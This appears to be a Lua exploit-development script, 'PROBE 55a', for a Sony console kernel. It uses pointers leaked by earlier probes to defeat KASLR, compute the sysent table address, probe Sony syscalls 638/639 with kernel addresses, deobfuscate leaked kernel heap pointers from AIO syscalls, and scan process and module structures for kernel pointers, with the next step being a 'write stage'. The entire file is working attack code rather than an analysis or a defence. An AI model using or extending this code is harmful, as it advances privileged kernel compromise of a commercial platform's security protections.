-- CRASH_CLASS: HIGH
-- PROBE 55a: Post-KASLR kernel memory reader
--
-- PREREQUISITE: A kernel pointer was leaked by probe 54f, 54a2, 54c, or 53b.
-- Fill in kernel_base below from the leaked pointer.
--
-- Strategy: Once we have the kernel base address, use sysctl and accessible
-- Sony syscalls to read kernel memory. The sysent table is at kernel_base + 0xe6e5c0
-- (48-byte stride, 679 entries). We also try to read proc/cred structs.

print("=== PROBE 55a: POST-KASLR KERNEL MEMORY READER ===")
print("")

-- =====================================================================
-- FILL IN: kernel_base from probe results
-- Example: if 54f leaked 0xFFFF8XXX_YYYYYYYY, compute base by alignment
-- The kernel .text base is page-aligned (16KB = 0x4000)
-- If you leaked LSTAR, subtract the known LSTAR offset from the base
-- If you leaked a heap pointer, this is a heap region not .text — see below
-- =====================================================================

-- FILL IN: Set these from your probe results
local kbase_hi = 0xFFFF8000  -- FILL IN: high 32 bits of kernel base
local kbase_lo = 0x00000000  -- FILL IN: low 32 bits of kernel base
-- If the leaked pointer was a HEAP address (from AIO obfuscation), set this:
local leaked_is_heap = false  -- set true if the leak was from 661/662/668

print(string.format("[*] Using kernel base: 0x%08X_%08X", kbase_hi, kbase_lo))
if leaked_is_heap then
    print("[*] Leaked pointer is HEAP — cannot directly index sysent")
    print("[*] Will use heap pointer for relative reads")
end
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end
local function is_kptr(h)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

local function make_u64(hi, lo)
    return uint64(string.format("0x%X%08X", hi, lo))
end

-- Get our PID
local sc_getpid = make_syscall(20)
local pid = 0
do
    local ok, ret = pcall(function() return sc_getpid() end)
    if ok then pid = to_num(ret) end
end
print("PID: " .. pid)

-- =====================================================================
-- METHOD 1: Use sysctl kern.proc.pid to get our kinfo_proc
-- This gives us process addresses relative to kernel DMAP/heap
-- =====================================================================
print("")
print("--- METHOD 1: kinfo_proc for our PID ---")

local sc_sysctl = make_syscall(202)
local mib = memory.alloc(32)
safe_wd(mib, 1)         -- CTL_KERN
safe_wd(mib + 4, 14)    -- KERN_PROC
safe_wd(mib + 8, 1)     -- KERN_PROC_PID
safe_wd(mib + 12, pid)

local kinfo = memory.alloc(0x800)
local kinfo_len = memory.alloc(8)
safe_wd(kinfo_len, 0x800)
safe_wd(kinfo_len + 4, 0)

-- Zero output
for i = 0, 0x7FC, 4 do safe_wd(kinfo + i, 0) end

local ok, ret = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(kinfo), uint64(kinfo_len), uint64(0), uint64(0))
end)

if ok then
    local rv = signed32(ret)
    local actual_len = safe_rd(kinfo_len) or 0
    print(string.format("  sysctl ret=%d, len=%d", rv, actual_len))

    if rv == 0 and actual_len > 0 then
        print("  Scanning kinfo_proc for kernel pointers...")
        local kptr_count = 0
        for i = 0, actual_len - 8, 8 do
            local q = safe_rq(kinfo + i)
            if q then
                local h, l = get_hi_lo(q)
                if is_kptr(h) then
                    kptr_count = kptr_count + 1
                    print(string.format("  >>> KPTR at kinfo+0x%03X: 0x%08X_%08X", i, h, l))
                end
            end
        end
        print("  Total kptrs in kinfo_proc: " .. kptr_count)

        -- Dump specific offsets from FreeBSD kinfo_proc structure:
        -- +0x000: ki_structsize
        -- +0x030: ki_pid
        -- +0x048: ki_ppid
        -- +0x0A0: ki_uid
        -- +0x0A4: ki_ruid
        -- +0x188: ki_comm (process name, 20 bytes)
        print("")
        print("  Key fields:")
        print("    structsize: " .. (safe_rd(kinfo) or 0))
        print("    pid:        " .. (safe_rd(kinfo + 0x30) or 0))
        print("    ppid:       " .. (safe_rd(kinfo + 0x48) or 0))
        print("    uid:        " .. (safe_rd(kinfo + 0xA0) or 0))
        print("    ruid:       " .. (safe_rd(kinfo + 0xA4) or 0))

        -- Try to extract comm name
        local comm = ""
        for j = 0, 19 do
            local b = safe_rd(kinfo + 0x188 + j)
            if b and b > 0 and b < 128 then
                comm = comm .. string.char(b)
            end
        end
        if comm ~= "" then print("    comm:       " .. comm) end

        -- Hexdump first 128 bytes
        print("")
        print("  First 128 bytes of kinfo_proc:")
        for off = 0, 0x7C, 16 do
            local parts = {}
            for j = 0, 12, 4 do
                local v = safe_rd(kinfo + off + j)
                if v then table.insert(parts, string.format("%08X", v))
                else table.insert(parts, "????????") end
            end
            print(string.format("    +%03X: %s", off, table.concat(parts, " ")))
        end
    end
else
    print("  sysctl FAILED: " .. tostring(ret))
end

-- =====================================================================
-- METHOD 2: If we have kernel .text base, compute sysent address
-- and try to validate by probing accessible sony syscall handlers
-- =====================================================================
print("")
print("--- METHOD 2: Sysent table validation ---")
print("")

if not leaked_is_heap then
    -- Sysent RVA is +0xe6e5c0 from kernel text base
    local sysent_rva_lo = 0xe6e5c0
    -- Compute sysent VA
    local sysent_lo = kbase_lo + sysent_rva_lo
    local sysent_hi = kbase_hi
    -- Handle carry
    if sysent_lo >= 0x100000000 then
        sysent_hi = sysent_hi + 1
        sysent_lo = sysent_lo - 0x100000000
    end
    print(string.format("  Computed sysent: 0x%08X_%08X", sysent_hi, sysent_lo))
    print("  (48-byte stride, 679 entries)")
    print("")

    -- We can't directly read kernel memory from userland
    -- But we can use the leaked base to verify our KASLR defeat:
    -- Try sys 639 (memory region info) with the kernel address
    print("  Probing kernel text region via sys 639...")
    local sc639 = make_syscall(639)
    local region_out = memory.alloc(0x200)
    for i = 0, 0x1FC, 4 do safe_wd(region_out + i, 0) end

    local ok639, ret639 = pcall(function()
        return sc639(make_u64(kbase_hi, kbase_lo), uint64(0x1000), uint64(region_out), uint64(0x200), uint64(0))
    end)
    if ok639 then
        local rv = signed32(ret639)
        print("    639(kernel_base, 0x1000, out) ret=" .. rv)
        if rv == 0 then
            print("    >>> sys 639 accepted kernel address! Dumping output:")
            for off = 0, 0x78, 8 do
                local q = safe_rq(region_out + off)
                if q then
                    local qh, ql = get_hi_lo(q)
                    local marker = ""
                    if is_kptr(qh) then marker = " <<< KPTR" end
                    print(string.format("      +%02X: 0x%08X_%08X%s", off, qh, ql, marker))
                end
            end
        end
    else
        print("    639 CRASHED: " .. tostring(ret639))
    end

    -- Try sys 638 too
    print("")
    print("  Probing via sys 638...")
    local sc638 = make_syscall(638)
    for i = 0, 0x1FC, 4 do safe_wd(region_out + i, 0) end

    local ok638, ret638 = pcall(function()
        return sc638(make_u64(kbase_hi, kbase_lo), uint64(0x1000), uint64(region_out), uint64(0x200))
    end)
    if ok638 then
        local rv = signed32(ret638)
        print("    638(kernel_base, 0x1000, out) ret=" .. rv)
        if rv == 0 then
            print("    >>> sys 638 accepted kernel address!")
            for off = 0, 0x38, 8 do
                local q = safe_rq(region_out + off)
                if q then
                    print(string.format("      +%02X: %s", off, hexval(q)))
                end
            end
        end
    else
        print("    638 CRASHED: " .. tostring(ret638))
    end
end

-- =====================================================================
-- METHOD 3: If HEAP leak (from AIO 661/662/668), do relative reads
-- The leaked pointer is into the kernel heap. Nearby objects may contain
-- proc/cred/ucred pointers. We can use sysctl tricks to correlate.
-- =====================================================================
if leaked_is_heap then
    print("")
    print("--- METHOD 3: Heap-relative correlation ---")
    print("")
    print("  Leaked heap pointer: " .. string.format("0x%08X_%08X", kbase_hi, kbase_lo))
    print("")

    -- Strategy: Call AIO syscalls repeatedly with different args
    -- Each call may return different obfuscated pointers
    -- Collecting multiple pointers maps out the heap region

    -- Deobfuscation function (from 54c)
    local function deobfuscate_ptr(h, l)
        local function get_nibble(hi, lo, pos)
            if pos < 8 then
                return math.floor(lo / (2^(pos*4))) % 16
            else
                return math.floor(hi / (2^((pos-8)*4))) % 16
            end
        end
        local ob = {}
        for i = 0, 15 do ob[i] = get_nibble(h, l, i) end
        local orig = {}
        orig[15] = ob[15]
        for i = 14, 0, -1 do
            local a, b = ob[i], orig[i + 1]
            local bxor = 0
            for bit = 0, 3 do
                local p = 2^bit
                if math.floor(a/p) % 2 ~= math.floor(b/p) % 2 then bxor = bxor + p end
            end
            orig[i] = bxor
        end
        local rh, rl = 0, 0
        for i = 0, 15 do
            if i < 8 then rl = rl + orig[i] * (2^(i*4))
            else rh = rh + orig[i] * (2^((i-8)*4)) end
        end
        return rh, rl
    end

    -- Collect multiple pointers from event subsystem
    local collected = {}
    local outbuf = memory.alloc(0x400)

    for num = 661, 670 do
        for i = 0, 0xFF, 4 do safe_wd(outbuf + i, 0) end
        local sc = make_syscall(num)
        local ok_call, ret_call = pcall(function()
            return sc(uint64(0), uint64(outbuf), uint64(0x100), uint64(0), uint64(0), uint64(0))
        end)
        if ok_call then
            local rv = signed32(ret_call)
            if rv >= 0 then
                for i = 0, 0xF8, 8 do
                    local q = safe_rq(outbuf + i)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh ~= 0 and qh ~= 0xFFFFFFFF then
                            local dh, dl = deobfuscate_ptr(qh, ql)
                            if is_kptr(dh) then
                                table.insert(collected, {num, i, dh, dl})
                                print(string.format("    %d+%02X: obf=%s deobf=0x%08X_%08X",
                                    num, i, hexval(q), dh, dl))
                            end
                        end
                    end
                end
            end
        end
    end

    print("")
    print("  Collected " .. #collected .. " kernel heap pointers")
    if #collected > 1 then
        print("  Pointer spread (for heap layout mapping):")
        local base_h, base_l = collected[1][3], collected[1][4]
        for _, c in ipairs(collected) do
            local diff_h = c[3] - base_h
            local diff_l = c[4] - base_l
            print(string.format("    %d+%02X: +0x%X%08X from first", c[1], c[2], diff_h, diff_l))
        end
    end
end

-- =====================================================================
-- METHOD 4: Deep module struct scan for kernel pointers
-- sys 593 returns 0x160 bytes. Check if init_proc/fini_proc/eh_frame
-- are kernel VA (not userland module VA)
-- =====================================================================
print("")
print("--- METHOD 4: Module struct deep scan ---")

local sc593 = make_syscall(593)
local info_buf = memory.alloc(0x200)
local handles = {1, 2, 8193, 0}

for _, h in ipairs(handles) do
    for i = 0, 0x1FC, 4 do safe_wd(info_buf + i, 0) end
    safe_wd(info_buf, 0x160)

    local ok593, ret593 = pcall(function()
        return sc593(uint64(h), uint64(info_buf), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if ok593 and signed32(ret593) >= 0 then
        -- Check fields that could be kernel VA
        local offsets = {
            {0x148, "init_proc_addr"},
            {0x150, "fini_proc_addr"},
            {0x158, "eh_frame_hdr"},
            {0x100, "unknown_0x100"},
            {0x108, "mapbase"},
            {0x110, "text_addr"},
        }
        for _, entry in ipairs(offsets) do
            local off = entry[1]
            local name = entry[2]
            local q = safe_rq(info_buf + off)
            if q then
                local qh, ql = get_hi_lo(q)
                if is_kptr(qh) then
                    print(string.format("  handle=%d +0x%03X (%s): 0x%08X_%08X <<< KERNEL PTR",
                        h, off, name, qh, ql))
                elseif qh > 0 and qh ~= 0xFFFFFFFF then
                    print(string.format("  handle=%d +0x%03X (%s): 0x%08X_%08X (unusual)",
                        h, off, name, qh, ql))
                end
            end
        end
    end
end

print("")
print("=== PROBE 55a COMPLETE ===")
print("If any KPTR was found above, use it to compute kernel_base")
print("and fill in 55b for the write stage.")
